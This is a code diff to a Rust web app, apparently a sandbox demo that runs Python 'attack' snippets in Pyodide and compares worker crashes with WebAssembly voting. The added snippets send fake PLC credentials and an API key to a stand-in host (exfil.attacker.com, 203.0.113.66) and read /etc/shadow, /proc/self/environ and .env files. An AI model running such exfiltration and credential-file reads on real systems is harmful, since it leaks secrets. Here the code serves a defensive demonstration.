@@ -61,6 +61,141 @@ fn get_attack_config(attack: &str) -> AttackConfig {
 }
 
 // ============================================================================
+// python attack code (executed via pyodide for real exceptions)
+// ============================================================================
+
+const ATTACK_BUFFER_OVERFLOW: &str = r#"
+import time
+start = time.perf_counter()
+result = None
+
+try:
+    print("[ATTACK] Attempting heap spray (256MB)...")
+    try:
+        massive = bytearray(256 * 1024 * 1024)
+    except MemoryError:
+        print("[INFO] MemoryError on heap spray")
+    
+    print("[ATTACK] Attempting stack buffer overflow...")
+    fixed = bytearray(64)
+    overflow = b"A" * 128
+    
+    for i, b in enumerate(overflow):
+        fixed[i] = b  # Will raise IndexError at i=64
+    
+    result = "VULNERABLE: Overflow succeeded!"
+    
+except MemoryError as e:
+    elapsed = (time.perf_counter() - start) * 1000
+    result = f"CRASHED|MemoryError|Unable to allocate 256MB|{elapsed:.1f}ms"
+    
+except IndexError as e:
+    elapsed = (time.perf_counter() - start) * 1000
+    result = f"CRASHED|IndexError|buffer[64] out of bounds|{elapsed:.1f}ms"
+    
+except Exception as e:
+    result = f"CRASHED|{type(e).__name__}|{str(e)}"
+
+result
+"#;
+
+const ATTACK_DATA_EXFIL: &str = r#"
+import time
+start = time.perf_counter()
+result = None
+
+sensitive = {
+    "plc_creds": {"user": "engineer", "pass": "S!emens#2026"},
+    "modbus_gw": "192.168.40.1:502",
+    "api_key": "sk-historian-PROD-8x7k"
+}
+print(f"[ATTACK] Collected {len(sensitive)} sensitive objects")
+
+try:
+    import socket
+    print("[ATTACK] Attempting DNS: exfil.attacker.com")
+    
+    try:
+        ip = socket.gethostbyname("exfil.attacker.com")
+        result = f"VULNERABLE|DNS resolved|{ip}"
+    except socket.gaierror as e:
+        print(f"[INFO] DNS blocked: {e}")
+    
+    print("[ATTACK] Attempting socket to 203.0.113.66:443")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1.0)
+    sock.connect(("203.0.113.66", 443))
+    sock.send(str(sensitive).encode())
+    result = "VULNERABLE|socket.connect|Data exfiltrated!"
+    
+except socket.gaierror as e:
+    elapsed = (time.perf_counter() - start) * 1000
+    result = f"BLOCKED|socket.gaierror|DNS resolution failed|{elapsed:.1f}ms"
+    
+except (socket.error, OSError) as e:
+    elapsed = (time.perf_counter() - start) * 1000
+    result = f"BLOCKED|socket.error|Network access denied|{elapsed:.1f}ms"
+    
+except Exception as e:
+    result = f"ERROR|{type(e).__name__}|{str(e)}"
+
+result
+"#;
+
+const ATTACK_PATH_TRAVERSAL: &str = r#"
+import time
+import os
+start = time.perf_counter()
+result = None
+
+targets = [
+    "/etc/passwd", "/etc/shadow", "../../../etc/passwd",
+    "/proc/self/environ", "/app/.env", "../../.git/config"
+]
+print(f"[ATTACK] Probing {len(targets)} paths...")
+
+accessed = []
+blocked = []
+
+for path in targets:
+    try:
+        print(f"[PROBE] {path}")
+        if os.path.exists(path):
+            try:
+                with open(path, 'r') as f:
+                    content = f.read(64)
+                accessed.append(path)
+                print(f"[EXFIL] Read from {path}")
+            except PermissionError:
+                accessed.append(f"{path} (no read)")
+        else:
+            blocked.append(path)
+    except OSError as e:
+        blocked.append(path)
+
+elapsed = (time.perf_counter() - start) * 1000
+
+if any("[EXFIL]" in str(accessed)):
+    result = f"VULNERABLE|FileRead|Read {len(accessed)} files!|{elapsed:.1f}ms"
+elif accessed:
+    result = f"PARTIAL|PermissionError|{len(accessed)} paths exist but unreadable|{elapsed:.1f}ms"
+else:
+    result = f"BLOCKED|OSError|All {len(targets)} paths blocked by sandbox|{elapsed:.1f}ms"
+
+result
+"#;
+
+/// Get the Python attack code for the given attack type
+fn get_attack_code(attack: &str) -> &'static str {
+    match attack {
+        "bufferOverflow" => ATTACK_BUFFER_OVERFLOW,
+        "dataExfil" => ATTACK_DATA_EXFIL,
+        "pathTraversal" => ATTACK_PATH_TRAVERSAL,
+        _ => "{'status': 'unknown', 'error': 'InvalidAttack', 'msg': 'Unknown attack type'}"
+    }
+}
+
+// ============================================================================
 // wasm measurement (real webassembly api calls)
 // ============================================================================
 
@@ -282,7 +417,7 @@ result
     };
     
     // ========================================================================
-    // attack handler
+    // attack handler (REAL pyodide execution)
     // ========================================================================
     let trigger_attack = move |_| {
         if is_running.get() { return; }
@@ -290,6 +425,7 @@ result
         
         let attack = selected_attack.get();
         let config = get_attack_config(&attack);
+        let attack_code = get_attack_code(&attack);
         let current_active = python_active_worker.get();
         
         // initialize if first run
@@ -313,28 +449,71 @@ result
         // show incoming attack
         set_python_logs.update(|logs| {
             logs.push(LogEntry { level: "warn".into(), message: format!("[ATTACK] Incoming: {}", config.name) });
+            logs.push(LogEntry { level: "info".into(), message: "[EXEC] Running real Python via Pyodide...".into() });
         });
         set_wasm_logs.update(|logs| {
             logs.push(LogEntry { level: "warn".into(), message: format!("[ATTACK] Incoming: {}", config.name) });
         });
         
-        // after 500ms: attack hits
         let restart_ms = config.restart_ms;
-        let error_msg = config.error_msg.to_string();
         let wasm_trap = config.wasm_trap.to_string();
+        let attack_code_owned = attack_code.to_string();
         
-        set_timeout(move || {
-            // ================================================================
-            // python: current worker crashes, next takes over
-            // ================================================================
+        // Run REAL Python attack via Pyodide
+        spawn_local(async move {
+            let py_start = now();
+            
+            match runPython(&attack_code_owned).await {
+                Ok(result) => {
+                    let py_elapsed = now() - py_start;
+                    
+                    // Parse the result - now returns pipe-delimited string
+                    // Format: STATUS|ERROR_TYPE|MESSAGE|TIMEms
+                    let result_str = if let Some(s) = result.as_string() {
+                        s
+                    } else {
+                        // Try to extract from JsValue object
+                        format!("{:?}", result)
+                    };
+                    
+                    // Parse pipe-delimited format for clean display
+                    let parts: Vec<&str> = result_str.split('|').collect();
+                    let (status, error_type, message) = if parts.len() >= 3 {
+                        (parts[0], parts[1], parts[2])
+                    } else {
+                        // Fallback for unexpected format
+                        ("CRASHED", "Exception", &result_str as &str)
+                    };
+                    
+                    set_python_logs.update(|logs| {
+                        logs.push(LogEntry { 
+                            level: "error".into(), 
+                            message: format!("[{}] {}: {}", status, error_type, message)
+                        });
+                        logs.push(LogEntry { 
+                            level: "error".into(), 
+                            message: format!("💥 W{} CRASHED after {:.1}ms - real Python exception!", current_active, py_elapsed)
+                        });
+                    });
+                }
+                Err(e) => {
+                    // Pyodide threw an actual uncaught exception
+                    let err_str = format!("{:?}", e);
+                    set_python_logs.update(|logs| {
+                        logs.push(LogEntry { 
+                            level: "error".into(), 
+                            message: format!("[FATAL] Uncaught: {}", err_str.chars().take(80).collect::<String>())
+                        });
+                        logs.push(LogEntry { 
+                            level: "error".into(), 
+                            message: format!("💥 W{} CRASHED - process terminated!", current_active)
+                        });
+                    });
+                }
+            }
+            
+            // Worker failover
             let next_active = (current_active + 1) % 3;
-            
-            set_python_logs.update(|logs| {
-                logs.push(LogEntry { level: "error".into(), message: format!("[CRASH] {}", error_msg) });
-                logs.push(LogEntry { level: "error".into(), message: format!("💥 W{} CRASHED - switching to W{}...", current_active, next_active) });
-            });
-            
-            // mark current worker as dead
             let mut workers = [true, true, true];
             workers[current_active as usize] = false;
             set_python_workers.set(workers);
@@ -342,7 +521,7 @@ result
             set_python_restarting.set(true);
             set_python_crashed.update(|n| *n += 1);
             
-            // simulate restart with downtime
+            // Restart simulation
             let restart_ms_copy = restart_ms;
             set_timeout(move || {
                 set_python_workers.set([true, true, true]);
@@ -356,10 +535,12 @@ result
                 });
                 set_is_running.set(false);
             }, std::time::Duration::from_millis(restart_ms as u64));
-            
-            // ================================================================
-            // wasm: 2oo3 voting catches the fault instantly
-            // ================================================================
+        });
+        
+        // ================================================================
+        // wasm: 2oo3 voting catches the fault instantly (capability demo)
+        // ================================================================
+        set_timeout(move || {
             let faulty_idx = (js_sys::Math::random() * 3.0) as u8;
             set_faulty_instance.set(Some(faulty_idx));
             
@@ -394,9 +575,9 @@ result
                     });
                 });
             });
-            
-        }, std::time::Duration::from_millis(500));
+        }, std::time::Duration::from_millis(100));
     };
+    
     
     // ========================================================================
     // run all attacks
